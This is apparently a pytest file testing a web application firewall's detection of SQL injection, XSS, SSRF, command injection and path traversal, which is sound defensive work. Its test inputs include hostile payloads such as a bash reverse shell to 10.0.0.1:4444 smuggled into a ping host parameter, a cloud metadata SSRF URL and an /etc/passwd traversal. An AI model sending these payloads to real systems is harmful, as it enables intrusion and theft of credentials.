"""Tests for the WAF engine — verifies SQLi, XSS, SSRF, RCE detection."""
from __future__ import annotations
import pytest
from cybernova.protection.waf import waf_engine


def test_sqli_detection():
    result = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = [f["category"] for f in result["findings"]]
    assert "sqli" in categories


def test_xss_detection():
    result = waf_engine.analyze_request("GET", "/comment", {"msg": "<script>alert('xss')</script>"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = [f["category"] for f in result["findings"]]
    assert "xss" in categories


def test_ssrf_detection():
    result = waf_engine.analyze_request("GET", "http://169.254.169.254/latest/meta-data/", {}, None, {"User-Agent": "curl/7.68"}, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = [f["category"] for f in result["findings"]]
    assert "ssrf" in categories


def test_cmd_injection():
    result = waf_engine.analyze_request("GET", "/ping", {"host": "8.8.8.8; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = [f["category"] for f in result["findings"]]
    assert "cmd_injection" in categories


def test_path_traversal():
    result = waf_engine.analyze_request("GET", "/download", {"file": "../../../etc/passwd"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = [f["category"] for f in result["findings"]]
    assert "path_traversal" in categories


def test_normal_request_no_false_positive():
    result = waf_engine.analyze_request("GET", "/api/users", {"page": "1", "limit": "10"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is False


def test_multi_attack_in_one_request():
    result = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1<script>alert(1)</script>"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert len(result["findings"]) >= 2
